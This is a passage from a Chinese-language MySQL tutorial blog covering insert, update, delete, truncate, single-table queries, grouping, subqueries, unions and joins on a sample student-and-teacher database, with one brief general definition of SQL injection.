<span class="hljs-operator">|</span> M   <span class="hljs-operator">|</span>   <span class="hljs-number">25</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------+-----+------+</span><br><span class="hljs-number">1</span> <span class="hljs-type">row</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##批量导入，将查询结果导入，插入<br>##要求：表结构一致<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> student1 <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student<br><span class="hljs-keyword">insert</span> student1 <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student;<br></code></pre></td></tr></table></figure><h3 id="有关自增长字段的用法，需要指明插入set的字段"><a href="#有关自增长字段的用法，需要指明插入set的字段" class="headerlink" title="有关自增长字段的用法，需要指明插入set的字段"></a>有关自增长字段的用法，需要指明插入set的字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">##在<span class="hljs-keyword">insert</span>这里需要在表中指明不添加id的字段，才可以实现id的自增，如果增加id字段，则需要写好id的值<br><span class="hljs-keyword">insert</span> student(name,sex,age) <span class="hljs-keyword">VALUES</span>(<span class="hljs-string">&#x27;xiao&#x27;</span>,<span class="hljs-string">&#x27;male&#x27;</span>,<span class="hljs-number">20</span>);<br><span class="hljs-operator">&gt;</span> Affected <span class="hljs-keyword">rows</span>: <span class="hljs-number">1</span><br><span class="hljs-operator">&gt;</span> 时间: <span class="hljs-number">0.003</span>s<br><br>##如果在<span class="hljs-keyword">insert</span>中不指定字段，则<span class="hljs-keyword">VALUES</span>默认插入所有，不写ID的值就会报错<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test (id auto_increment)<br></code></pre></td></tr></table></figure><p>update语句：修改语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">##修改学生的年龄<br><span class="hljs-keyword">update</span> table_name <span class="hljs-keyword">set</span> 字段名 <span class="hljs-keyword">where</span>(条件判断，一般是id)<br>##<span class="hljs-keyword">update</span><br><span class="hljs-keyword">update</span> student <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span><span class="hljs-number">30</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">3</span>;<br></code></pre></td></tr></table></figure><p>delete语句：删除语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">##<span class="hljs-keyword">delete</span><br><span class="hljs-keyword">delete</span> <span class="hljs-keyword">from</span> student <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><h3 id="truncate：清空表，同时释放磁盘空间—-gt-非常危险，慎用"><a href="#truncate：清空表，同时释放磁盘空间—-gt-非常危险，慎用" class="headerlink" title="truncate：清空表，同时释放磁盘空间—&gt;非常危险，慎用"></a>truncate：清空表，同时释放磁盘空间—&gt;非常危险，慎用</h3><p>保留表结果，高危指令，同时也会释放磁盘空间</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">truncate</span> <span class="hljs-keyword">table</span> test;<br><br>##执行一个.<span class="hljs-keyword">sql</span>插入<span class="hljs-number">10</span>w条记录的脚本<br>##创建一个表，id自增主键，名字<span class="hljs-number">10</span>个字符，工资默认<span class="hljs-number">20</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> testlog (id <span class="hljs-type">int</span> auto_increment <span class="hljs-keyword">primary</span> key,name <span class="hljs-type">char</span>(<span class="hljs-number">10</span>),salary <span class="hljs-type">int</span> <span class="hljs-keyword">default</span> <span class="hljs-number">20</span>);<br><br>##声明一个函数<br>delimiter $$<br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">procedure</span>  sp_testlog() <br><span class="hljs-keyword">begin</span>  <br><span class="hljs-keyword">declare</span> i <span class="hljs-type">int</span>;<br><span class="hljs-keyword">set</span> i <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; <br>while i <span class="hljs-operator">&lt;=</span> <span class="hljs-number">100000</span> <br>do  <span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> testlog(name,salary) <span class="hljs-keyword">values</span> (concat(<span class="hljs-string">&#x27;wang&#x27;</span>,<span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">100000</span>)),<span class="hljs-built_in">FLOOR</span>(RAND() <span class="hljs-operator">*</span> <span class="hljs-number">1000000</span>)); <br><span class="hljs-keyword">set</span> i <span class="hljs-operator">=</span> i <span class="hljs-operator">+</span><span class="hljs-number">1</span>; <br><span class="hljs-keyword">end</span> while; <br><span class="hljs-keyword">end</span>$$<br><br>delimiter ;<br><br>##执行函数，用了<span class="hljs-number">49</span>s<br><span class="hljs-keyword">call</span> sp_testlog;<br><span class="hljs-keyword">CALL</span> sp_testlog;<br><span class="hljs-operator">&gt;</span> OK<br><span class="hljs-operator">&gt;</span> 时间: <span class="hljs-number">49.073</span>s<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181326910-2059997911.png" alt="image-20220817231343943"></p><p>使用truncate实验，清空表数据，同时释放磁盘空间，不常用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs none">truncate table testlog<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181327232-1719226667.png" alt="image-20220817231521851"></p><h2 id="6-DQL语句：单表查询-重点掌握"><a href="#6-DQL语句：单表查询-重点掌握" class="headerlink" title="6.DQL语句：单表查询(重点掌握)"></a>6.DQL语句：单表查询(重点掌握)</h2><p>一般DML语句都是修改的，通过.sql脚本进行增删查改，或者是项目之初建库的时候，直接执行.sql的语句进行批量业务数据的插入</p><p>其实SQL的查询语句就类似英文句子</p><p>单表查询</p><p>count(*)：只显示有值的，NULL空是没有的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查询对应的列(域field)<br><span class="hljs-keyword">select</span> Name,Age <span class="hljs-keyword">from</span> students;<br><br>##给输出的字段加别名，可以不这么用<br><span class="hljs-keyword">select</span> name 姓名 <span class="hljs-keyword">from</span> students;<br><br>##查询表内一共有多少条记录：<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)，有<span class="hljs-number">25</span>条，只显示有值的，如果为<span class="hljs-keyword">NULL</span>则没有<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> students;<br><br>##空或者非空，存在或者非存在<br><span class="hljs-keyword">NULL</span><br><span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">NULL</span><br>exist<br><span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> exist<br></code></pre></td></tr></table></figure><p>select+where查询</p><p>limit：可以限制首页可以查看多少条记录，过了就要翻下一页</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">##精确查询到某一行，<span class="hljs-keyword">and</span>并列<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> age <span class="hljs-operator">&lt;</span><span class="hljs-number">20</span> <span class="hljs-keyword">and</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;F&#x27;</span>;<br><br>##<span class="hljs-keyword">or</span>或者<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> age <span class="hljs-operator">&lt;</span><span class="hljs-number">20</span> <span class="hljs-keyword">or</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;F&#x27;</span>;<br><br>##相同列不同的取数，同一列不同值<br>从<span class="hljs-number">1</span>班和<span class="hljs-number">3</span>班中挑出女生<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> classid <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">3</span>) <span class="hljs-keyword">and</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;M&#x27;</span>;<br><br>##<span class="hljs-keyword">between</span>之间<br><span class="hljs-number">1</span>班和<span class="hljs-number">3</span>班中取出年龄在<span class="hljs-number">20</span><span class="hljs-number">-30</span>岁的学生<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> classid <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">3</span>) <span class="hljs-keyword">and</span> age <span class="hljs-keyword">between</span> <span class="hljs-number">20</span> <span class="hljs-keyword">and</span> <span class="hljs-number">30</span>;<br></code></pre></td></tr></table></figure><h3 id="select-limit-限制查看的条目数"><a href="#select-limit-限制查看的条目数" class="headerlink" title="select limit 限制查看的条目数"></a>select limit 限制查看的条目数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs sql">##直接看前<span class="hljs-number">3</span>条记录<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students limit <span class="hljs-number">3</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students limit <span class="hljs-number">10</span>;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age <span class="hljs-keyword">desc</span> limit <span class="hljs-number">5</span>;<br><span class="hljs-number">25</span>Sun Dasheng<span class="hljs-number">100</span>M<br><span class="hljs-number">3</span>Xie Yanke<span class="hljs-number">53</span>M<span class="hljs-number">2</span><span class="hljs-number">16</span><br><span class="hljs-number">6</span>Shi Qing<span class="hljs-number">46</span>M<span class="hljs-number">5</span><br><span class="hljs-number">13</span>Tian Boguang<span class="hljs-number">33</span>M<span class="hljs-number">2</span><br><span class="hljs-number">4</span>Ding Dian<span class="hljs-number">32</span>M<span class="hljs-number">4</span><span class="hljs-number">4</span><br><br>##limit跳过前<span class="hljs-number">3</span>行，从第<span class="hljs-number">4</span>行开始显示<span class="hljs-number">6</span>行<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students limit <span class="hljs-number">3</span>,<span class="hljs-number">6</span>;<br><span class="hljs-number">4</span>Ding Dian<span class="hljs-number">32</span>M<span class="hljs-number">4</span><span class="hljs-number">4</span><br><span class="hljs-number">5</span>Yu Yutong<span class="hljs-number">26</span>M<span class="hljs-number">3</span><span class="hljs-number">1</span><br><span class="hljs-number">6</span>Shi Qing<span class="hljs-number">46</span>M<span class="hljs-number">5</span><br><span class="hljs-number">7</span>Xi Ren<span class="hljs-number">19</span>F<span class="hljs-number">3</span><br><span class="hljs-number">8</span>Lin Daiyu<span class="hljs-number">17</span>F<span class="hljs-number">7</span><br><span class="hljs-number">9</span>Ren Yingying<span class="hljs-number">20</span>F<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>where判断是否为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">select * from students where classid is null;<br>select * from students where classid is not null;<br></code></pre></td></tr></table></figure><p>模糊查询like</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查询以name ma开头的记录<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> &quot;%ma%&quot;;<br><br>##查询包含姓名内包含x的记录，可以作为在网站内查询某个商品，一般都是模糊查询，比如我要查罗技，但是这个品牌下有很多记录，会显示所有的模糊查询记录，然后按照一定顺序(比如说购买量)显示出来<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> name <span class="hljs-keyword">like</span> &quot;%x%&quot;;<br></code></pre></td></tr></table></figure><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">##统计平均年龄，总数<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> students;<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> students;<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">sum</span>(age) <span class="hljs-keyword">from</span> students;<br><br>##男生女生中年龄最大的，以性别分组<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">max</span>(age) <span class="hljs-keyword">from</span> students <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br></code></pre></td></tr></table></figure><p>sql注入攻击</p><p>绕过数据库的安全监测，导致黑客成功登录到网站的后台/网站的数据库，从而窃取数据；利用数据库的user&amp;password的漏洞</p><h3 id="select-group-by分组统计"><a href="#select-group-by分组统计" class="headerlink" title="select group by分组统计"></a>select group by分组统计</h3><p>group by语法：如果使用了group by的写法，前面select的字段就只能是group by的条件字段，或者是聚合函数</p><p>不是group by的东西</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs sql">##<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>分组统计，按照性别<br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> students <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br>M<span class="hljs-number">33.0000</span><br>F<span class="hljs-number">19.0000</span><br><br>##添加多一个字段，就报错<br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age),stuid <span class="hljs-keyword">from</span> students <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender<br><span class="hljs-operator">&gt;</span> <span class="hljs-number">1055</span> <span class="hljs-operator">-</span> Expression <br>#<span class="hljs-number">3</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">SELECT</span> list <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> clause <span class="hljs-keyword">and</span> <span class="hljs-keyword">contains</span> nonaggregated <span class="hljs-keyword">column</span> <span class="hljs-string">&#x27;hellodb.students.StuID&#x27;</span> which <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> functionally dependent <span class="hljs-keyword">on</span> columns <span class="hljs-keyword">in</span> <span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> clause; this <span class="hljs-keyword">is</span> incompatible <span class="hljs-keyword">with</span> sql_mode<span class="hljs-operator">=</span>only_full_group_by<br><br>##<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>后继续过滤条件：<span class="hljs-keyword">having</span>或者是<span class="hljs-keyword">where</span>，两种写法；<span class="hljs-keyword">from</span>后面加<span class="hljs-keyword">where</span>过滤条件，或者是<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>后面加<span class="hljs-keyword">having</span><br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> students <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender;<br>M<span class="hljs-number">33.0000</span><br>F<span class="hljs-number">19.0000</span><br><br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> students <span class="hljs-keyword">where</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;F&#x27;</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender; <br><span class="hljs-keyword">select</span> gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> students <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender <span class="hljs-keyword">having</span> gender<span class="hljs-operator">=</span><span class="hljs-string">&#x27;M&#x27;</span>;<br><br>##多个字段<span class="hljs-keyword">Group</span> <span class="hljs-keyword">by</span>，过滤掉空行<br><span class="hljs-keyword">select</span> ClassID,gender,<span class="hljs-built_in">avg</span>(age) <span class="hljs-keyword">from</span> students  <span class="hljs-keyword">WHERE</span> ClassID <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> gender,ClassID;<br></code></pre></td></tr></table></figure><h3 id="select-order-by排序"><a href="#select-order-by排序" class="headerlink" title="select order by排序"></a>select order by排序</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">##正序倒序排序，正序从小到大，倒序从大到小，类似sort，sort默认由小到大，sort <span class="hljs-operator">-</span>r从大到小<br>##排序<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age;<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> age <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><h2 id="7-SQL多表查询-重点掌握"><a href="#7-SQL多表查询-重点掌握" class="headerlink" title="7.SQL多表查询(重点掌握)"></a>7.SQL多表查询(重点掌握)</h2><p><img src="2792175-20220828181327734-407844475.png" alt="image-20220820112949822"></p><h3 id="子查询：嵌套SQL语句"><a href="#子查询：嵌套SQL语句" class="headerlink" title="子查询：嵌套SQL语句"></a>子查询：嵌套SQL语句</h3><p>SQL语句中嵌套了别的查询结果</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql">##子查询，实现修改老师年龄为学生最大年龄<br><span class="hljs-keyword">select</span> <span class="hljs-built_in">max</span>(age) <span class="hljs-keyword">from</span> students;<br><span class="hljs-keyword">update</span> teachers <span class="hljs-keyword">set</span> age<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">max</span>(age) <span class="hljs-keyword">from</span> students) <span class="hljs-keyword">where</span> tid<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-number">1</span>Song Jiang<span class="hljs-number">100</span>M<br><span class="hljs-number">2</span>Zhang Sanfeng<span class="hljs-number">94</span>M<br><span class="hljs-number">3</span>Miejue Shitai<span class="hljs-number">77</span>F<br><span class="hljs-number">4</span>Lin Chaoying<span class="hljs-number">93</span>F<br><br>##子查询作为条件<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers <span class="hljs-keyword">where</span> age<span class="hljs-operator">=</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">max</span>(age) <span class="hljs-keyword">from</span> students);<br></code></pre></td></tr></table></figure><h3 id="联合查询union-字段数量相同"><a href="#联合查询union-字段数量相同" class="headerlink" title="联合查询union(字段数量相同)"></a>联合查询union(字段数量相同)</h3><p>将多张表合并成一张表，联合查询这个大表</p><p>需要相同字段数量，不能字段数量不统一，最好是字段的数据类型类似或者相同</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sql">##联合查询，凡是查询都可以加别名<br><span class="hljs-keyword">select</span> stuid,name,age,gender <span class="hljs-keyword">from</span> students <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers;<br><span class="hljs-keyword">select</span> stuid ID,name 姓名,age 年龄,gender 性别 <span class="hljs-keyword">from</span> students <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> teachers; <br><span class="hljs-number">1</span>Shi Zhongyu<span class="hljs-number">22</span>M<br><span class="hljs-number">2</span>Shi Potian<span class="hljs-number">22</span>M<br><span class="hljs-number">3</span>Xie Yanke<span class="hljs-number">53</span>M<br><span class="hljs-number">4</span>Ding Dian<span class="hljs-number">32</span>M<br><span class="hljs-number">5</span>Yu Yutong<span class="hljs-number">26</span>M<br><span class="hljs-number">6</span>Shi Qing<span class="hljs-number">46</span>M<br><span class="hljs-number">7</span>Xi Ren<span class="hljs-number">19</span>F<br><span class="hljs-number">8</span>Lin Daiyu<span class="hljs-number">17</span>F<br><span class="hljs-number">9</span>Ren Yingying<span class="hljs-number">20</span>F<br><span class="hljs-number">10</span>Yue Lingshan<span class="hljs-number">19</span>F<br></code></pre></td></tr></table></figure><p>横向合并，交叉连接cross join，乘积算法，不常用，因为出来的结果太大了</p><p>表1：学生表，25条记录</p><p>表2：老师表，4条记录，老师表和学生表逐一组合，形成4*25=100条记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs none">##cross join<br>select * from students cross join teachers;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181328161-275014696.png" alt="image-20220820110133835"></p><h3 id="内连接inner-join：交集"><a href="#内连接inner-join：交集" class="headerlink" title="内连接inner join：交集"></a>内连接inner join：交集</h3><p><img src="2792175-20220828181328429-1476079978.png" alt="image-20220820113418419"></p><p>前提：两张表最好有类似的字段，一样的数据，不然无法筛选的</p><p>取两张表的相同字段的值，也可以指定查询的字段，显示出来，可以给查询的表写别名来区分不同的表的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql">##案例：学生表和老师表共同在于teacherid和tid有相同的<br><span class="hljs-number">1.</span>先列出需要查询显示的字段，students s teachers t，可用这样的表示法来写明哪张表<br><span class="hljs-number">2.</span><span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span>内连接<br><span class="hljs-number">3.</span><span class="hljs-keyword">on</span> 条件判断相等<br><span class="hljs-keyword">select</span> s.StuID,s.name,s.TeacherID,t.name,t.tid <span class="hljs-keyword">from</span> students s <span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> teachers t <span class="hljs-keyword">on</span> s.TeacherID<span class="hljs-operator">=</span>t.TID;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181328721-1704275971.png" alt="image-20220820110111770"></p><p>inner join相同条件的记录数只有3条</p><p>多次取内连接</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">##成绩表<br>##显示学生成绩<br><span class="hljs-keyword">select</span> s.stuid,s.name,sc.CourseID,sc.Score <span class="hljs-keyword">from</span> scores sc <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> students s <span class="hljs-keyword">on</span> sc.StuID<span class="hljs-operator">=</span>s.StuID;<br><br>##三张表内连接取相同字段，在前面用<span class="hljs-keyword">select</span>显示需要查询的字段，能显示出课程名称<br>##显示学生id，姓名(student)，课程名(course)，分数(score)<br><span class="hljs-keyword">select</span> st.stuid,st.name,co.Course,sc.Score <span class="hljs-keyword">from</span> scores sc <span class="hljs-keyword">inner</span> <span class="hljs-keyword">join</span> students st <span class="hljs-keyword">on</span> sc.StuID<span class="hljs-operator">=</span>st.StuID <span class="hljs-keyword">inner</span> <span class="hljs-keyword">JOIN</span> courses co <span class="hljs-keyword">on</span> sc.CourseID<span class="hljs-operator">=</span>co.CourseID;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181328963-633085938.png" alt="image-20220820114610272"></p><p><img src="2792175-20220828181329284-844691555.png" alt="image-20220820115317553"></p><h3 id="左外连接和右外连接：left-join"><a href="#左外连接和右外连接：left-join" class="headerlink" title="左外连接和右外连接：left join"></a>左外连接和右外连接：left join</h3><p><img src="2792175-20220828181329559-1210890777.png" alt="image-20220820113427740"></p><p>保存左表(右表)的全部数据，条件on写对应两张表的条件，如果查询的左表(右表)记录数不符合，则填NULL代替；兼顾不同边</p><p>为什么right join老师表只有4条记录，有一条为空？—&gt;因为有一个teacher ID对不上t ID，所以为NULL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">##<span class="hljs-keyword">left</span> <span class="hljs-keyword">join</span><br>##因为stu有<span class="hljs-number">25</span>条记录，teacher有<span class="hljs-number">4</span>条记录，所以除了ID对应好的那几条，其余的teacher表都为<span class="hljs-keyword">NULL</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students s <span class="hljs-keyword">left</span> <span class="hljs-keyword">JOIN</span> teachers t <span class="hljs-keyword">on</span> s.TeacherID<span class="hljs-operator">=</span>t.TID;<br><br>##<span class="hljs-keyword">right</span> <span class="hljs-keyword">join</span><br>##因为stu有<span class="hljs-number">25</span>条记录，teacher有<span class="hljs-number">4</span>条记录，所以除了ID对应好的那几条，其余的stu表都为<span class="hljs-keyword">NULL</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> students s <span class="hljs-keyword">right</span> <span class="hljs-keyword">JOIN</span> teachers t <span class="hljs-keyword">on</span> s.TeacherID<span class="hljs-operator">=</span>t.TID;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181329880-1121404312.png" alt="image-20220820112036307"></p><p><img src="2792175-20220828181330175-1042091537.png" alt="image-20220820112051634"></p><p>左外连接和右外连接取反：去掉对应条件，想想交集和并集就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs none">##left join取反<br>select * from students s left JOIN teachers t on s.TeacherID=t.TID where t.TID is null;<br><br>##right join取反<br>select * from students s right JOIN teachers t on s.TeacherID=t.TID;<br></code></pre></td></tr></table></figure><p><img src="2792175-20220828181330454-709513067.png" 